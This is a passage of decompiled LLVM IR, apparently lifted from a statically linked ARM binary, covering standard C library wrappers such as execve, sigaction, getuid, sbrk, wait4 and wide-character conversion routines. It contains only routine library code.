  %v2_13a48 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_13a2c, i32* %r0.global-to-local, align 4
  %v2_13a50 = inttoptr i32 %v0_13a2c to i32*
  store i32 %v2_13a48, i32* %v2_13a50, align 4
  %v3_13a50 = load i32, i32* %r0.global-to-local, align 4
  %v4_13a50 = add i32 %v3_13a50, 4
  store i32 %v4_13a50, i32* @r0, align 4
  %v2_13a54 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_13a54, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_13a5c = call i32 @memcpy()
  store i32 %v0_13a5c, i32* %r0.global-to-local, align 4
  %v1_13a64 = load i32, i32* @r5, align 4
  %v2_13a64 = add i32 %v1_13a64, 136
  %v3_13a64 = inttoptr i32 %v2_13a64 to i32*
  %v1_13a6c = load i32, i32* @r5, align 4
  %v2_13a6c = add i32 %v1_13a6c, 132
  %v3_13a6c = inttoptr i32 %v2_13a6c to i32*
  %v0_13a70.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13a70

dec_label_pc_13a70:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_13a48
  %v0_13a70 = phi i32 [ %v1_13a28, %thread-pre-split ], [ %v0_13a70.pre, %dec_label_pc_13a48 ], [ %v1_13a28, %thread-pre-split.thread ]
  store i32 %v0_13a70, i32* %r0.global-to-local, align 4
  store i32 %v3_139a0, i32* @r4, align 4
  store i32 %v6_139a0, i32* @r5, align 4
  ret i32 %v0_13a70

; uselistorder directives
  uselistorder i32 %v0_13a70, { 1, 0 }
  uselistorder i32 %v0_13a2c, { 1, 0, 2 }
  uselistorder i32 %v0_13a24, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 6, 5, 7, 0 }
  uselistorder label %dec_label_pc_13a70, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_13a04, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_13a84 = load i32, i32* @r4, align 4
  store i32 %v3_13a84, i32* %stack_var_-8, align 4
  %v0_13a88 = load i32, i32* @r0, align 4
  %v0_13a8c = call i32 @__errno_location()
  %v1_13a90 = sub i32 0, %v0_13a88
  %v2_13a94 = inttoptr i32 %v0_13a8c to i32*
  store i32 %v1_13a90, i32* %v2_13a94, align 4
  %v2_13a9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13a9c, i32* @r4, align 4
  ret i32 -1
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_13aa0 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_13aa0
}

define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_13aa4 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_13aa4
}

define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13aa8 = load i32, i32* @r4, align 4
  store i32 %v3_13aa8, i32* %stack_var_-8, align 4
  %v1_13aac = load i32, i32* @r1, align 4
  %v2_13aac = inttoptr i32 %v1_13aac to %sigaction*
  %v3_13aac = load i32, i32* @r2, align 4
  %v4_13aac = inttoptr i32 %v3_13aac to %sigaction*
  %v5_13aac = call i32 @sigaction(i32 %arg1, %sigaction* %v2_13aac, %sigaction* %v4_13aac)
  store i32 %v5_13aac, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13aac, -4095
  br i1 %tmp, label %dec_label_pc_13acc, label %dec_label_pc_13abc

dec_label_pc_13abc:                               ; preds = %entry
  %v0_13abc = call i32 @__errno_location()
  %v0_13ac0 = load i32, i32* %r4.global-to-local, align 4
  %v1_13ac0 = sub i32 0, %v0_13ac0
  %v2_13ac4 = inttoptr i32 %v0_13abc to i32*
  store i32 %v1_13ac0, i32* %v2_13ac4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13acc

dec_label_pc_13acc:                               ; preds = %entry, %dec_label_pc_13abc
  %v0_13acc = phi i32 [ %v5_13aac, %entry ], [ -1, %dec_label_pc_13abc ]
  %v2_13ad0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13ad0, i32* %r4.global-to-local, align 4
  ret i32 %v0_13acc

; uselistorder directives
  uselistorder i32 %v5_13aac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13acc, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13ad4 = load i32, i32* @r4, align 4
  store i32 %v3_13ad4, i32* %stack_var_-8, align 4
  %v0_13ad8 = load i32, i32* @r0, align 4
  %v1_13ad8 = inttoptr i32 %v0_13ad8 to i8*
  %v2_13ad8 = load i32, i32* @r1, align 4
  %v3_13ad8 = inttoptr i32 %v2_13ad8 to i8*
  %v4_13ad8 = insertvalue [1 x i8*] undef, i8* %v3_13ad8, 0
  %v5_13ad8 = load i32, i32* @r2, align 4
  %v6_13ad8 = inttoptr i32 %v5_13ad8 to i8*
  %v7_13ad8 = insertvalue [1 x i8*] undef, i8* %v6_13ad8, 0
  %v8_13ad8 = call i32 @execve(i8* %v1_13ad8, [1 x i8*] %v4_13ad8, [1 x i8*] %v7_13ad8)
  store i32 %v8_13ad8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_13ad8, -4095
  br i1 %tmp, label %dec_label_pc_13af8, label %dec_label_pc_13ae8

dec_label_pc_13ae8:                               ; preds = %entry
  %v0_13ae8 = call i32 @__errno_location()
  %v0_13aec = load i32, i32* %r4.global-to-local, align 4
  %v1_13aec = sub i32 0, %v0_13aec
  %v2_13af0 = inttoptr i32 %v0_13ae8 to i32*
  store i32 %v1_13aec, i32* %v2_13af0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13af8

dec_label_pc_13af8:                               ; preds = %entry, %dec_label_pc_13ae8
  %v0_13af8 = phi i32 [ %v8_13ad8, %entry ], [ -1, %dec_label_pc_13ae8 ]
  %v2_13afc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13afc, i32* @r4, align 4
  ret i32 %v0_13af8

; uselistorder directives
  uselistorder i32 %v8_13ad8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13af8, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13b00 = load i32, i32* @r4, align 4
  store i32 %v3_13b00, i32* %stack_var_-8, align 4
  %v0_13b08 = load i32, i32* @r0, align 4
  store i32 %v0_13b08, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13b08, -4095
  br i1 %tmp, label %dec_label_pc_13b24, label %dec_label_pc_13b14

dec_label_pc_13b14:                               ; preds = %entry
  %v0_13b14 = call i32 @__errno_location()
  %v0_13b18 = load i32, i32* %r4.global-to-local, align 4
  %v1_13b18 = sub i32 0, %v0_13b18
  %v2_13b1c = inttoptr i32 %v0_13b14 to i32*
  store i32 %v1_13b18, i32* %v2_13b1c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13b28.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13b24

dec_label_pc_13b24:                               ; preds = %entry, %dec_label_pc_13b14
  %v2_13b28 = phi i32 [ %v3_13b00, %entry ], [ %v2_13b28.pre, %dec_label_pc_13b14 ]
  %v0_13b24 = phi i32 [ %v0_13b08, %entry ], [ -1, %dec_label_pc_13b14 ]
  store i32 %v2_13b28, i32* @r4, align 4
  ret i32 %v0_13b24

; uselistorder directives
  uselistorder i32 %v0_13b08, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13b24, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13b2c = load i32, i32* @r4, align 4
  store i32 %v3_13b2c, i32* %stack_var_-8, align 4
  %v0_13b34 = load i32, i32* @r0, align 4
  store i32 %v0_13b34, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13b34, -4095
  br i1 %tmp, label %dec_label_pc_13b50, label %dec_label_pc_13b40

dec_label_pc_13b40:                               ; preds = %entry
  %v0_13b40 = call i32 @__errno_location()
  %v0_13b44 = load i32, i32* %r4.global-to-local, align 4
  %v1_13b44 = sub i32 0, %v0_13b44
  %v2_13b48 = inttoptr i32 %v0_13b40 to i32*
  store i32 %v1_13b44, i32* %v2_13b48, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13b54.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13b50

dec_label_pc_13b50:                               ; preds = %entry, %dec_label_pc_13b40
  %v2_13b54 = phi i32 [ %v3_13b2c, %entry ], [ %v2_13b54.pre, %dec_label_pc_13b40 ]
  %v0_13b50 = phi i32 [ %v0_13b34, %entry ], [ -1, %dec_label_pc_13b40 ]
  store i32 %v2_13b54, i32* @r4, align 4
  ret i32 %v0_13b50

; uselistorder directives
  uselistorder i32 %v0_13b34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13b50, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13b58 = load i32, i32* @r4, align 4
  store i32 %v3_13b58, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13b7c, label %dec_label_pc_13b6c

dec_label_pc_13b6c:                               ; preds = %entry
  %v0_13b6c = call i32 @__errno_location()
  %v0_13b70 = load i32, i32* %r4.global-to-local, align 4
  %v1_13b70 = sub i32 0, %v0_13b70
  %v2_13b74 = inttoptr i32 %v0_13b6c to i32*
  store i32 %v1_13b70, i32* %v2_13b74, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13b80.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13b7c

dec_label_pc_13b7c:                               ; preds = %entry, %dec_label_pc_13b6c
  %v2_13b80 = phi i32 [ %v3_13b58, %entry ], [ %v2_13b80.pre, %dec_label_pc_13b6c ]
  %v0_13b7c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_13b6c ]
  store i32 %v2_13b80, i32* %r4.global-to-local, align 4
  ret i32 %v0_13b7c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13b7c, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13b84 = load i32, i32* @r4, align 4
  store i32 %v3_13b84, i32* %stack_var_-8, align 4
  %v0_13b8c = load i32, i32* @r0, align 4
  store i32 %v0_13b8c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13b8c, -4095
  br i1 %tmp, label %dec_label_pc_13ba8, label %dec_label_pc_13b98

dec_label_pc_13b98:                               ; preds = %entry
  %v0_13b98 = call i32 @__errno_location()
  %v0_13b9c = load i32, i32* %r4.global-to-local, align 4
  %v1_13b9c = sub i32 0, %v0_13b9c
  %v2_13ba0 = inttoptr i32 %v0_13b98 to i32*
  store i32 %v1_13b9c, i32* %v2_13ba0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13bac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13ba8

dec_label_pc_13ba8:                               ; preds = %entry, %dec_label_pc_13b98
  %v2_13bac = phi i32 [ %v3_13b84, %entry ], [ %v2_13bac.pre, %dec_label_pc_13b98 ]
  %v0_13ba8 = phi i32 [ %v0_13b8c, %entry ], [ -1, %dec_label_pc_13b98 ]
  store i32 %v2_13bac, i32* %r4.global-to-local, align 4
  ret i32 %v0_13ba8

; uselistorder directives
  uselistorder i32 %v0_13b8c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13ba8, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_13bb0 = load i32, i32* @r4, align 4
  store i32 %v3_13bb0, i32* %stack_var_-8, align 4
  %v6_13bb4 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_13bb4, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_13bb4, -4095
  br i1 %tmp6, label %dec_label_pc_13bd4, label %dec_label_pc_13bc4

dec_label_pc_13bc4:                               ; preds = %entry
  %v0_13bc4 = call i32 @__errno_location()
  %v0_13bc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13bc8 = sub i32 0, %v0_13bc8
  %v2_13bcc = inttoptr i32 %v0_13bc4 to i32*
  store i32 %v1_13bc8, i32* %v2_13bcc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13bd4

dec_label_pc_13bd4:                               ; preds = %entry, %dec_label_pc_13bc4
  %v0_13bd4 = phi i32 [ %v6_13bb4, %entry ], [ -1, %dec_label_pc_13bc4 ]
  %v2_13bd8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13bd8, i32* %r4.global-to-local, align 4
  ret i32 %v0_13bd4

; uselistorder directives
  uselistorder i32 %v6_13bb4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13bd4, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13bdc = load i32, i32* @r4, align 4
  store i32 %v3_13bdc, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_297a8.560 to i32), i32* %r4.global-to-local, align 4
  %v2_13be4 = load i32, i32* @global_var_297a8.560, align 4
  %v2_13be8 = icmp eq i32 %v2_13be4, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_13be8, label %dec_label_pc_13bf8, label %dec_label_pc_13c04

dec_label_pc_13bf8:                               ; preds = %entry
  %v2_13bf8 = call i32 @__GI_brk(i32* null)
  %v1_13bfc = icmp slt i32 %v2_13bf8, 0
  br i1 %v1_13bfc, label %dec_label_pc_13c24, label %dec_label_pc_13c04thread-pre-split

dec_label_pc_13c04thread-pre-split:               ; preds = %dec_label_pc_13bf8
  %v0_13c08.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_13c04.pre = load i32, i32* @global_var_297a8.560, align 4
  br label %dec_label_pc_13c04

dec_label_pc_13c04:                               ; preds = %dec_label_pc_13c04thread-pre-split, %entry
  %v2_13c04 = phi i32 [ %v2_13c04.pre, %dec_label_pc_13c04thread-pre-split ], [ %v2_13be4, %entry ]
  %v1_13c10 = phi i32 [ %v0_13c08.pr, %dec_label_pc_13c04thread-pre-split ], [ %arg1, %entry ]
  %v2_13c08 = icmp eq i32 %v1_13c10, 0
  store i32 %v2_13c04, i32* %r4.global-to-local, align 4
  br i1 %v2_13c08, label %dec_label_pc_13c28, label %dec_label_pc_13c18

dec_label_pc_13c18:                               ; preds = %dec_label_pc_13c04
  %v2_13c10 = add i32 %v1_13c10, %v2_13c04
  %v1_13c18 = inttoptr i32 %v2_13c10 to i32*
  %v2_13c18 = call i32 @__GI_brk(i32* %v1_13c18)
  %v1_13c1c = icmp slt i32 %v2_13c18, 0
  br i1 %v1_13c1c, label %dec_label_pc_13c24, label %dec_label_pc_13c18.dec_label_pc_13c28_crit_edge

dec_label_pc_13c18.dec_label_pc_13c28_crit_edge:  ; preds = %dec_label_pc_13c18
  %v0_13c28.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c28

dec_label_pc_13c24:                               ; preds = %dec_label_pc_13c18, %dec_label_pc_13bf8
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c28

dec_label_pc_13c28:                               ; preds = %dec_label_pc_13c18.dec_label_pc_13c28_crit_edge, %dec_label_pc_13c04, %dec_label_pc_13c24
  %v0_13c28 = phi i32 [ %v0_13c28.pre, %dec_label_pc_13c18.dec_label_pc_13c28_crit_edge ], [ %v2_13c04, %dec_label_pc_13c04 ], [ -1, %dec_label_pc_13c24 ]
  %v2_13c2c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13c2c, i32* @r4, align 4
  ret i32 %v0_13c28

; uselistorder directives
  uselistorder i32 %v2_13c04, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 3, 4, 5, 6, 7, 9, 10, 8, 11, 12, 13, 14, 15, 16, 22, 23, 20, 21, 19, 18, 17, 24, 25, 26, 2 }
  uselistorder label %dec_label_pc_13c28, { 2, 0, 1 }
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13c34 = load i32, i32* @r4, align 4
  store i32 %v3_13c34, i32* %stack_var_-8, align 4
  %v0_13c38 = call i32 @wait4()
  store i32 %v0_13c38, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13c38, -4095
  br i1 %tmp, label %dec_label_pc_13c58, label %dec_label_pc_13c48

dec_label_pc_13c48:                               ; preds = %entry
  %v0_13c48 = call i32 @__errno_location()
  %v0_13c4c = load i32, i32* %r4.global-to-local, align 4
  %v1_13c4c = sub i32 0, %v0_13c4c
  %v2_13c50 = inttoptr i32 %v0_13c48 to i32*
  store i32 %v1_13c4c, i32* %v2_13c50, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c58

dec_label_pc_13c58:                               ; preds = %entry, %dec_label_pc_13c48
  %v0_13c58 = phi i32 [ %v0_13c38, %entry ], [ -1, %dec_label_pc_13c48 ]
  %v2_13c5c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13c5c, i32* @r4, align 4
  ret i32 %v0_13c58

; uselistorder directives
  uselistorder i32 %v0_13c38, { 1, 0, 2 }
  uselistorder i32 ()* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_13c58, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_29788.562 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_13c70 = icmp eq i32 %arg1, 0
  br i1 %v2_13c70, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_13c78 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_13ca0 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_13c94 = phi i32 [ %arg1, %.thread ], [ %v3_13c78, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_13c8c = ptrtoint i32* %stack_var_-16 to i32
  %v2_13c98 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_13c98, i32* %stack_var_-16, align 4
  store i32 %v0_13ca0, i32* %stack_var_-12, align 4
  %v5_13ca8 = inttoptr i32 %v0_13c94 to i8*
  %v6_13ca8 = call i32 @__GI_wcsnrtombs(i8* %v5_13ca8, i32 %v2_13c8c, i32 1, i32 16, i32 %arg3)
  %v2_13cac = icmp eq i32 %v6_13ca8, 0
  br i1 %v2_13cac, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_13cb8 = phi i32 [ %v6_13ca8, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_13cb8

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_13cc8 = load i32, i32* @r2, align 4
  store i32 %v0_13cc8, i32* @r3, align 4
  %v0_13cd0 = load i32, i32* @r0, align 4
  %v1_13cd0 = load i32, i32* @r1, align 4
  %v5_13cd0 = inttoptr i32 %v0_13cd0 to i8*
  %v6_13cd0 = call i32 @__GI_wcsnrtombs(i8* %v5_13cd0, i32 %v1_13cd0, i32 -1, i32 %v0_13cc8, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_13cd0
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13cdc = load i32, i32* @r4, align 4
  store i32 %v3_13cdc, i32* %stack_var_-8, align 4
  %v10_13ce0 = icmp eq i32 %tmp, %arg2
  br i1 %v10_13ce0, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v0_13ce81 = load i32, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13cfc

bb:                                               ; preds = %entry
  %v4_13ce4 = icmp eq i8* %arg1, null
  %v0_13ce8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br i1 %v4_13ce4, label %dec_label_pc_13cfc, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d38

dec_label_pc_13cfc:                               ; preds = %.thread, %bb
  %v1_13d3c.ph = phi i32 [ %v0_13ce8, %bb ], [ %v0_13ce81, %.thread ]
  %v2_13cec3.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_13cfc = icmp eq i8* %arg1, null
  store i32 %v2_13cec3.ph, i32* %ip.global-to-local, align 4
  br i1 %v3_13cfc, label %.thread4, label %dec_label_pc_13d30

.thread4:                                         ; preds = %dec_label_pc_13cfc
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_13d38

dec_label_pc_13d14:                               ; preds = %dec_label_pc_13d50
  %v0_13d14 = call i32 @__errno_location()
  store i32 %v0_13d14, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13d20 = inttoptr i32 %v0_13d14 to i32*
  store i32 84, i32* %v2_13d20, align 4
  %v0_13d8c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d8c

dec_label_pc_13d28:                               ; preds = %dec_label_pc_13d60
  %v3_13d64 = zext i8 %v2_13d64 to i32
  store i32 %v3_13d64, i32* @lr, align 4
  br label %dec_label_pc_13d80

dec_label_pc_13d30:                               ; preds = %dec_label_pc_13cfc
  store i32 %v2_13cec3.ph, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d38

dec_label_pc_13d38:                               ; preds = %bb27, %.thread4, %dec_label_pc_13d30
  %v1_13d3c20 = phi i32 [ %v0_13ce8, %bb27 ], [ %v1_13d3c.ph, %.thread4 ], [ %v1_13d3c.ph, %dec_label_pc_13d30 ]
  %v2_13d6014 = phi i32 [ %tmp, %bb27 ], [ %v2_13cec3.ph, %.thread4 ], [ %v2_13cec3.ph, %dec_label_pc_13d30 ]
  %v1_13d38 = load i32, i32* @r3, align 4
  %v3_13d38 = icmp uge i32 %v1_13d3c20, %v1_13d38
  %v1_13d38.v1_13d3c20 = select i1 %v3_13d38, i32 %v1_13d38, i32 %v1_13d3c20
  store i32 %v1_13d38.v1_13d3c20, i32* %r4.global-to-local, align 4
  %v1_13d44 = inttoptr i32 %arg2 to i32*
  %v2_13d44 = load i32, i32* %v1_13d44, align 4
  store i32 %v2_13d44, i32* @lr, align 4
  store i32 %v1_13d38.v1_13d3c20, i32* %r0.global-to-local, align 4
  %v2_13d788 = icmp eq i32 %v1_13d38.v1_13d3c20, 0
  br i1 %v2_13d788, label %dec_label_pc_13d80, label %dec_label_pc_13d50

dec_label_pc_13d50:                               ; preds = %dec_label_pc_13d38, %dec_label_pc_13d70.dec_label_pc_13d50_crit_edge
  %v2_13d60 = phi i32 [ %v2_13d70, %dec_label_pc_13d70.dec_label_pc_13d50_crit_edge ], [ %v2_13d6014, %dec_label_pc_13d38 ]
  %v0_13d58 = phi i32 [ %v0_13d50.pre, %dec_label_pc_13d70.dec_label_pc_13d50_crit_edge ], [ %v2_13d44, %dec_label_pc_13d38 ]
  %v1_13d50 = inttoptr i32 %v0_13d58 to i32*
  %v2_13d50 = load i32, i32* %v1_13d50, align 4
  %v1_13d58 = add i32 %v0_13d58, 4
  store i32 %v1_13d58, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_13d50, 127
  br i1 %tmp36, label %dec_label_pc_13d14, label %dec_label_pc_13d60

dec_label_pc_13d60:                               ; preds = %dec_label_pc_13d50
  %v1_13d60 = trunc i32 %v2_13d50 to i8
  %v3_13d60 = inttoptr i32 %v2_13d60 to i8*
  store i8 %v1_13d60, i8* %v3_13d60, align 1
  %v0_13d64 = load i32, i32* %ip.global-to-local, align 4
  %v1_13d64 = inttoptr i32 %v0_13d64 to i8*
  %v2_13d64 = load i8, i8* %v1_13d64, align 1
  %v2_13d68 = icmp eq i8 %v2_13d64, 0
  br i1 %v2_13d68, label %dec_label_pc_13d28, label %dec_label_pc_13d70

dec_label_pc_13d70:                               ; preds = %dec_label_pc_13d60
  %v1_13d70 = load i32, i32* %r2.global-to-local, align 4
  %v2_13d70 = add i32 %v1_13d70, %v0_13d64
  store i32 %v2_13d70, i32* %ip.global-to-local, align 4
  %v0_13d74 = load i32, i32* %r0.global-to-local, align 4
  %v1_13d74 = add i32 %v0_13d74, -1
  store i32 %v1_13d74, i32* %r0.global-to-local, align 4
  %v2_13d78 = icmp eq i32 %v1_13d74, 0
  br i1 %v2_13d78, label %dec_label_pc_13d80, label %dec_label_pc_13d70.dec_label_pc_13d50_crit_edge

dec_label_pc_13d70.dec_label_pc_13d50_crit_edge:  ; preds = %dec_label_pc_13d70
  %v0_13d50.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_13d50

dec_label_pc_13d80:                               ; preds = %dec_label_pc_13d70, %dec_label_pc_13d38, %dec_label_pc_13d28
  %v0_13d80 = phi i32 [ %v0_13d64, %dec_label_pc_13d28 ], [ %v2_13d6014, %dec_label_pc_13d38 ], [ %v2_13d70, %dec_label_pc_13d70 ]
  %v1_13d80 = load i32, i32* @sp, align 4
  %v9_13d80 = icmp eq i32 %v0_13d80, %v1_13d80
  br i1 %v9_13d80, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_13d80
  %v1_13d84 = load i32, i32* @lr, align 4
  store i32 %v1_13d84, i32* %v1_13d44, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_13d80, %bb30
  %v0_13d88 = load i32, i32* %r0.global-to-local, align 4
  %v1_13d88 = load i32, i32* %r4.global-to-local, align 4
  %v2_13d88 = sub i32 %v1_13d88, %v0_13d88
  store i32 %v2_13d88, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d8c

dec_label_pc_13d8c:                               ; preds = %dec_label_pc_13d14, %bb31
  %v0_13d8c = phi i32 [ %v0_13d8c.pre, %dec_label_pc_13d14 ], [ %v2_13d88, %bb31 ]
  store i32 %v0_13d8c, i32* %r0.global-to-local, align 4
  %v2_13d94 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13d94, i32* %r4.global-to-local, align 4
  ret i32 %v0_13d8c

; uselistorder directives
  uselistorder i32 %v0_13d8c, { 1, 0 }
  uselistorder i32 %v1_13d74, { 1, 0 }
  uselistorder i32 %v2_13d70, { 0, 2, 1 }
  uselistorder i32 %v2_13d50, { 1, 0 }
  uselistorder i32 %v2_13d6014, { 1, 0 }
  uselistorder i32 %v1_13d3c.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 6, 3, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* @sp, { 15, 17, 0, 7, 8, 9, 10, 11, 12, 13, 14, 1, 2, 3, 4, 5, 6, 16 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13d8c, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_13d50, { 1, 0 }
  uselistorder label %dec_label_pc_13d38, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13cfc, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
